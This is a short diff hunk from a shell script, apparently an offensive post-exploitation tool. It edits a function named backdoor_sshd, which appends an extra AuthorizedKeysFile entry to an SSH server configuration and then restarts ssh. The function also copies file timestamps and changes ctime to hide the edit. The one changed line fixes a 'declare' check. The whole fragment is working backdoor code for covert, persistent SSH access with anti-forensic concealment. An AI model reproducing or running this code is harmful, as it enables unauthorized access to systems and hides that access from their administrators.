@@ -1825,7 +1825,7 @@ backdoor_sshd() {
 	grep -qm1 '^AuthorizedKeysFile' "$N" 2>/dev/null && { echo >&2 "WARN: Already backdoored"; return; }
 	echo -e "AuthorizedKeysFile\t.ssh/authorized_keys .ssh/authorized_keys2 ${K}.pub" >>"${N}" || return
 	touch -r "$K" "$N" "$D" \
-	&& declare -f ctime >/dev/null && ctime "$N" "$D"
+	&& declare -F ctime >/dev/null && ctime "$N" "$D"
 	systemctl restart ssh
 }
 backdoor_sshd
